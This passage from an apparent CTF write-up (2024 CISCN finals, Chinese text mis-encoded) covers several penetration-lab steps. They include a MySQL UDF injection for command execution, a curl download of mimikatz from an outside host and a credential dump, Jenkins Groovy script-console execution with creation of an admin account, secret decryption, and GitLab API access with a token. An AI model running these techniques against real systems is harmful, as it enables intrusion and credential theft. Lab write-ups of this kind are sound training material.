EB4000037B4000047B4000055B400005DB400006CB4000079B4000081B4000090B4000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span> <span class="token keyword">INTO</span> <span class="token keyword">DUMPFILE</span> <span class="token string">"C:\\Program Files\\MySQL\\MySQL Server 8.0\\lib\\plugin\\udf.so"</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">FUNCTION</span> sys_eval <span class="token keyword">RETURNS</span> STRING <span class="token keyword">SONAME</span> <span class="token string">"udf.so"</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"type C:\\Users\\Administrator\\flag\\flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¯»åˆ°flagï¼ˆè‰æˆ‘æ€ä¹ˆå†™äº†ä¸ªsoè¿›å»ï¼Œåº”è¯¥æ˜¯dllçš„ï¼‰</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721095325681.png" alt="image-20240721095325681"></p><p>æ¥ä¸‹æ¥å°è¯•ä¸¢mimikatzæ”¶é›†ä¿¡æ¯ï¼ˆå®é™…æ— ç”¨ï¼‰</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"curl  http://192.168.36.88:8080/mimikatz.exe -o mimikatz.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'"mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > test.txt"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'"mimikatz.exe "privilege::debug" "log" "lsadump::dcsync /user:Administrator" "exit" > test.txt"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'"mimikatz.exe "privilege::debug" "log" "creds_all" "exit" > test.txt"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/mimikatz(commandline) # privilege::debugPrivilege '20' OKmimikatz(commandline) # logUsing 'mimikatz.log' for logfile : OKmimikatz(commandline) # sekurlsa::logonpasswordsAuthentication Id : 0 ; 68033 (00000000:000109c1)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-90-0-1msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 996 (00000000:000003e4)Session           : Service from 0User Name         : WIN-OPS88$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-20msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos : * Username : win-ops88$ * Domain   : WORKGROUP * Password : (null)ssp :credman :cloudap :Authentication Id : 0 ; 31473 (00000000:00007af1)Session           : Interactive from 0User Name         : UMFD-0Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-96-0-0msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 68016 (00000000:000109b0)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-90-0-1msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-19msv :tspkg :wdigest : * Username : (null) * Domain   : (null) * Password : (null)kerberos : * Username : (null) * Domain   : (null) * Password : (null)ssp :credman :cloudap :Authentication Id : 0 ; 31470 (00000000:00007aee)Session           : Interactive from 1User Name         : UMFD-1Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-96-0-1msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 30495 (00000000:0000771f)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 7/21/2024 6:17:46 AMSID               : msv :tspkg :wdigest :kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : WIN-OPS88$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 7/21/2024 6:17:46 AMSID               : S-1-5-18msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos : * Username : win-ops88$ * Domain   : WORKGROUP * Password : (null)ssp :credman :cloudap :mimikatz(commandline) # exitBye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/mimikatz(commandline) # privilege::debugPrivilege '20' OKmimikatz(commandline) # logUsing 'mimikatz.log' for logfile : OKmimikatz(commandline) # lsadump::dcsync /user:AdministratorERROR kuhl_m_lsadump_dcsync ; Domain not present, or doesn't look like a FQDNmimikatz(commandline) # exitBye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/mimikatz(commandline) # privilege::debugPrivilege '20' OKmimikatz(commandline) # logUsing 'mimikatz.log' for logfile : OKmimikatz(commandline) # creds_allERROR mimikatz_doLocal ; "creds_all" command of "standard" module not found !Module :standardFull name :Standard moduleDescription :Basic commands (does not require module name)            exit  -  Quit mimikatz             cls  -  Clear screen (doesn't work with redirections, like PsExec)          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything          coffee  -  Please, make me a coffee!           sleep  -  Sleep an amount of milliseconds             log  -  Log mimikatz input/output to file          base64  -  Switch file input/output base64         version  -  Display some version informations              cd  -  Change or display current directory       localtime  -  Displays system local date and time (OJ command)        hostname  -  Displays system local hostnamemimikatz(commandline) # exitBye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éƒ½æ²¡å•¥ç”¨</p><p>çœ‹åˆ«äººè¿™é‡Œæ˜¯<code>net user Administrator &lt;password&gt;</code>è¿›è¡Œå¯†ç ä¿®æ”¹ï¼Œç„¶åé€šè¿‡WindowsRDPè¿›è¡Œè¿œç¨‹æ¡Œé¢ç™»é™†</p><hr><h2 id="RODCï¼ˆUnsolvedï¼‰"><a href="#RODCï¼ˆUnsolvedï¼‰" class="headerlink" title="RODCï¼ˆUnsolvedï¼‰"></a>RODCï¼ˆUnsolvedï¼‰</h2><p>ä¸æ‡‚ï¼Œå¥½åƒæ˜¯smbå¯†ç å–·æ´’</p><p>åˆ«çš„å¸ˆå‚…çš„éé¢„æœŸï¼š</p><p>åœ¨WIN-OPS88æ¡Œé¢ä¸Šæœ‰ä¸€ä¸ª<code>WPS OFFICE</code>ï¼Œç‚¹å¼€åæŸ¥çœ‹Recentï¼Œå‘ç°äº†ä¸€ä¸ªè¡¨æ ¼ï¼Œé‡Œé¢æœ‰ä¸€ç»„è´¦å·å¯†ç ã€‚</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1370778707.png" alt="2024-07-22T06:05:09.png"></p><p>ç”±äºæ–‡ä»¶åå¸¦æœ‰<code>ROAdmins</code>ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯RODCç›¸å…³å¯†ç ï¼Œå‘ç°è¿™äº›å¯†ç å‡èƒ½è¿œç¨‹ç™»é™†RODC Windowsçš„RDP</p><p><br>å¯æƒœæˆ‘æ²¡ç»ƒè¿‡æ¸—é€ï¼Œä¸ç„¶åº”è¯¥èƒ½æƒ³åˆ°æ‹¿å®ŒWindowsçš„shellåè¦å°è¯•ä¸‹rdpçš„</p><hr><h2 id="Jinkens"><a href="#Jinkens" class="headerlink" title="Jinkens"></a>Jinkens</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.16:8080  code:403 len:594    title:None<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>jenkinsæœåŠ¡</p><p>æµ‹è¯•å‡ºè´¦å¯†admin:admin123å¯ä»¥ç™»å½•è¿›å»</p><p>åœ¨Script Consoleé‡Œé¢æ‰“Groovyè„šæœ¬å°±è¡Œï¼šå‚è€ƒ<a href="https://xz.aliyun.com/t/6372">https://xz.aliyun.com/t/6372</a></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721105348773.png" alt="image-20240721105348773"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721105555762.png" alt="image-20240721105555762"></p><p>é‚£ä¹ˆåŒæ ·çš„å¯ä»¥è¯»flag</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">String fileContents <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">'C:\\Users\\Administrator\\flag\\flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721105744258.png" alt="image-20240721105744258"></p><p>æˆ–è€…æ‰§è¡Œå‘½ä»¤ï¼š</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">println <span class="token interpolation-string"><span class="token string">"whoami"</span></span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><p>è¿œç¨‹æ¡Œé¢è´¦å¯†ï¼š</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">println <span class="token interpolation-string"><span class="token string">"net user test qwer1234! /add"</span></span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textprintln <span class="token interpolation-string"><span class="token string">"net localgroup administrators test /add"</span></span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="Gitlabï¼ˆTimeOutï¼‰"><a href="#Gitlabï¼ˆTimeOutï¼‰" class="headerlink" title="Gitlabï¼ˆTimeOutï¼‰"></a>Gitlabï¼ˆTimeOutï¼‰</h2><p>é ï¼Œæ˜¯åŸé¢˜ï¼š<a href="https://xz.aliyun.com/t/13378">https://xz.aliyun.com/t/13378</a></p><p>ä½†æ˜¯æœ€åååˆ†é’Ÿçš„æ—¶å€™æ‰å‘ç°ï¼Œæ¥ä¸åŠäº†æ²¡åšå®Œï¼Œjenkinsçš„æœåŠ¡è¿˜æ…¢å¾—è¦æ­»ã€‚ã€‚</p><p>ä¾æ—§æ˜¯åœ¨Jenkinsé‡Œé¢ï¼Œè¿›å…¥å¯¹åº”é€‰é¡¹å¡ï¼Œç‚¹å‡»change password</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721140214428.png" alt="image-20240721140214428"></p><p>ctrl+uæ‰¾åˆ°apitoken</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&#123;AQAAABAAAAAgvBTIIfz3QQnmD8y+ncKsVDqTEsdqjxdp/rkK9tRPkckOfP9xBtu6uqckTjQJ6gJj&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹æ¥ç”¨Script consoleè§£å¯†</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token function">println</span><span class="token punctuation">(</span>hudson<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Secret<span class="token punctuation">.</span><span class="token function">fromString</span><span class="token punctuation">(</span><span class="token interpolation-string"><span class="token string">"&#123;AQAAABAAAAAgvBTIIfz3QQnmD8y+ncKsVDqTEsdqjxdp/rkK9tRPkckOfP9xBtu6uqckTjQJ6gJj&#125;"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPlainText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‰©ä¸‹çš„æ¥ä¸åŠäº†ğŸ˜­</p><br><p>æœ‰äº†apitokenä¹‹åå°±èƒ½è®¿é—®gitlabçš„æ‰€æœ‰ä»“åº“</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token function">curl</span> <span class="token parameter variable">--header</span> <span class="token string">"PRIVATE-TOKEN: glpat-bGEgHAJDvwaPP78rsLeS"</span> <span class="token string">"http://192.168.8.42/api/v4/projects"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥è·å¾—ä¸€ä¸ªå·¨å¤§çš„è¿”å›jsonï¼Œé€šè¿‡è¿™ä¸ªjsonå¯ä»¥è§‚å¯Ÿåˆ°GitLabä¸­æ‰€æœ‰çš„å‚¨å­˜åº“ä¿¡æ¯</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span>        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoftBackup"</span><span class="token punctuation">,</span>        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / VertexSoftBackup"</span><span class="token punctuation">,</span>        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoftbackup"</span><span class="token punctuation">,</span>        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/vertexsoftbackup"</span><span class="token punctuation">,</span>        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:03:43.603Z"</span><span class="token punctuation">,</span>        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/vertexsoftbackup.git"</span><span class="token punctuation">,</span>        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexsoftbackup.git"</span><span class="token punctuation">,</span>        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexsoftbackup"</span><span class="token punctuation">,</span>        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexsoftbackup/-/blob/main/README.md"</span><span class="token punctuation">,</span>        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-17T05:42:29.243Z"</span><span class="token punctuation">,</span>        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5"</span><span class="token punctuation">,</span>            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/issues"</span><span class="token punctuation">,</span>            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/merge_requests"</span><span class="token punctuation">,</span>            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/repository/branches"</span><span class="token punctuation">,</span>            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/labels"</span><span class="token punctuation">,</span>            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/events"</span><span class="token punctuation">,</span>            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/members"</span><span class="token punctuation">,</span>            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/cluster_agents"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T17:03:43.667Z"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span>        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-17T05:42:29.243Z"</span><span class="token punctuation">,</span>        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token 